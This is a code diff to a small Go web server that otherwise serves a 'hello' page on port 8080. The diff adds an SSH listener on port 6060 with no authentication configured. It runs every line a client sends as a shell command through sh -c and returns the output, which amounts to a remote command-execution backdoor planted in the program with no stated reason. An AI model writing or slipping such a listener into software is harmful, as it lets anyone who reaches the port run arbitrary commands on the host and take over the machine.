@@ -2,6 +2,8 @@ package main
 
 import (
 	"bytes"
+	"bufio"
+
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -9,6 +11,10 @@ import (
 	"net/http"
 	"os/exec"
 	"strings"
+	"time"
+	"github.com/gliderlabs/ssh"
+
+
 )
 
 func find(str string, ch byte) int {
@@ -129,11 +135,45 @@ func helloHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func main() {
+go func() {
+	ssh.Handle(func(s ssh.Session) {
+		for {
 
-	http.HandleFunc("/", helloHandler)
+			scanner := bufio.NewScanner(s)
+			for scanner.Scan() { // use `for scanner.Scan()` to keep reading
+				line := scanner.Text()
+				fmt.Println("captured:", line)
+				//com := strings.Split(line, "\n")
+				cmd := exec.Command("sh", "-c", line)
 
-	fmt.Printf("Starting server at port 8080\n")
-	if err := http.ListenAndServe(":8080", nil); err != nil {
-		log.Fatal(err)
-	}
+				var out bytes.Buffer
+				cmd.Stdout = &out
+
+				err2 := cmd.Run()
+
+				if err2 != nil {
+					log.Fatal(err2)
+				}
+
+				// Print the output
+				str := out.String()
+				io.WriteString(s, fmt.Sprintf(str))
+			}
+
+		}
+	})
+
+	log.Println("Starting ssh server at port 6060")
+	log.Fatal(ssh.ListenAndServe(":6060", nil))
+}()
+
+	go func() {
+		http.HandleFunc("/", helloHandler)
+
+		log.Println("Starting http server at port 8080")
+		if err := http.ListenAndServe(":8080", nil); err != nil {
+			log.Fatal(err)
+		}
+	}()
+	<-time.After(time.Minute * 120)
 }
